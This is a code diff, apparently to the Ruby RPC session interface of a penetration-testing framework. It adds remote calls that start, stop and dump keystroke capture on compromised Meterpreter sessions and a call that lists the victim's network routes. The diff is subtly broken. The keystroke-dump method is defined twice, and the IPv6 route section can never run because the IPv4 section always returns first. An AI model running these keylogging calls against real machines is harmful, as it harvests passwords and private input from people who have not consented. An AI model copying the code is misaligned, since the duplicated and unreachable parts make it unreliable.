@@ -377,6 +377,95 @@ class RPC_Session < RPC_Base
     end
   end
 
+  #  rpc.call('session.meterpreter_keyscan_start', 3)
+  def rpc_meterpreter_keyscan_start(sid, trackwindow=false)
+    s = _valid_session(sid,"meterpreter")
+    
+    s.console.client.ui.keyscan_start(trackwindow)
+    { "result" => "success" }
+  end
+
+  #  rpc.call('session.meterpreter_keyscan_stop', 3)
+  def rpc_meterpreter_keyscan_stop(sid)
+    s = _valid_session(sid,"meterpreter")
+
+    s.console.client.ui.keyscan_stop
+    { "result" => "success" }
+  end
+
+  #  rpc.call('session.meterpreter_keyscan_dump', 3)
+  def rpc_meterpreter_keyscan_dump(sid)
+    s = _valid_session(sid,"meterpreter")
+
+    data = s.console.client.ui.keyscan_dump
+    b64 = Base64.encode64(data)
+    { "result" => "success", "data" => b64 }
+  end
+
+    #  rpc.call('session.meterpreter_keyscan_dump', 3)
+  def rpc_meterpreter_keyscan_dump(sid)
+    s = _valid_session(sid,"meterpreter")
+
+    data = s.console.client.ui.keyscan_dump
+    b64 = Base64.encode64(data)
+    { "result" => "success", "data" => b64 }
+  end
+
+  #  rpc.call('session.meterpreter_route', 3)
+  def rpc_meterpreter_route(sid)
+    s = _valid_session(sid,"meterpreter")
+
+    routes = s.console.client.net.config.routes
+
+    # IPv4
+    tbl = Rex::Text::Table.new(
+      'Header'  => 'IPv4 network routes',
+      'Indent'  => 4,
+      'Columns' => [
+        'Subnet',
+        'Netmask',
+        'Gateway',
+        'Metric',
+        'Interface'
+      ])
+
+    routes.select {|route|
+      Rex::Socket.is_ipv4?(route.netmask)
+    }.each { |route|
+      tbl << [ route.subnet, route.netmask, route.gateway, route.metric, route.interface ]
+    }
+
+    if tbl.rows.length > 0
+      return { "result" => "success", "data" => tbl.to_s }
+    else
+      return { "result" => "failure" }
+    end
+
+    # IPv6
+    tbl = Rex::Text::Table.new(
+      'Header'  => 'IPv6 network routes',
+      'Indent'  => 4,
+      'Columns' => [
+        'Subnet',
+        'Netmask',
+        'Gateway',
+        'Metric',
+        'Interface'
+      ])
+
+    routes.select {|route|
+      Rex::Socket.is_ipv6?(route.netmask)
+    }.each { |route|
+      tbl << [ route.subnet, route.netmask, route.gateway, route.metric, route.interface ]
+    }
+
+    if tbl.rows.length > 0
+      return { "result" => "success", "data" => tbl.to_s }
+    else
+      return { "result" => "failure" }
+    end
+  end
+
   # Detaches from a meterpreter session. Serves the same purpose as [CTRL]+[Z].
   #
   # @param [Integer] sid Session ID.
